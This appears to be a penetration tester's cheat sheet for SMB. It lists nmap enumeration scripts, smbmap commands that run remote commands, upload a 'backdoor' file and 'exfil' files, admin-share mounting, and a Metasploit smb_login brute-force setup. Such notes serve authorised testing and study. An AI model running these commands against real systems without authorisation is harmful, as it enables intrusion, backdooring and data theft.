With credentials, you can mount SMB shares as network drives and enumerate.

net use \* /delete
net use Z: \\\\<ip>\C$ <password> /user:<user>

**NMAP Enumeration**
nmap -p445 --script smb-protocols <ip> (available protocols)
nmap -p445 --script smb-security-mode <ip> (security level info)
nmap -p445 --script smb-enum-sessions <ip> (list sessions without auth)
nmap -p445 --script smb-enum-sessions --script-args smbusername=<user>,smbpassword=<pass> <ip> (list sessions with auth)
nmap -p445 --script smb-enum-shares <ip> (list shares and perms)
can add --script-args above to add auth
nmap -p445 --script smb-enum-domains <ip>
nmap -p445 --script smb-enum-users <ip>
nmap -p445 --script smb-enum-groups <ip>
nmap -p445 --script smb-server-stats <ip>
nmap -p 445 --script smb-enum-services <ip>
nmap -p445 --script smb-enum-shares,smb-ls <ip>

**SMBMap Enumeration**
smbmap -u guest -p "" -d . -H <ip> (enumerate things available to the guest account)
smbmap -u <user> -p <pass> -d . -H <ip> 
smbmap -H <ip> -u <user> -p <pass> -x '<command>' (execute command via smb)
smbmap -H <ip> -u <user> -p <pass> -L (list drives)
smbmap -H <ip> -u <user> -p <pass> -r 'C$' (list contents of C drive)
smbmap -H <ip> -u <user> -p <pass> --upload '<localfile>' <remotefile> (upload backdoor file to smb target machine)
smbmap -H <ip> -u <user> -p <pass> --download '<file>' (exfil file)

**Metasploit**

use auxiliary/scanner/smb/smb_login 
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS <ip>
set VERBOSE false

**Other**
sudo nbtscan -r <ip>